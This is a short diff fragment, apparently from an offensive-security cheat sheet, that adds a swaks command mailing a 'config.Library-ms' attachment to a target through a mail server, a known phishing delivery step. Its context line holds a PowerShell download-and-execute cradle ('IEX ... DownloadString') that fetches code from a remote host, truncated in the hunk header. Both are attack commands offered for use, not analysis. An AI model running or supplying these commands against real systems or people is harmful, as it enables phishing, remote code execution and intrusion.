@@ -50,5 +50,5 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$
 
 Send email via mail server:
 ``` bash
-
+swaks -to $destination --from $sender -ap --attach @config.Library-ms --server $MAILSRV --suppress-data
 ```
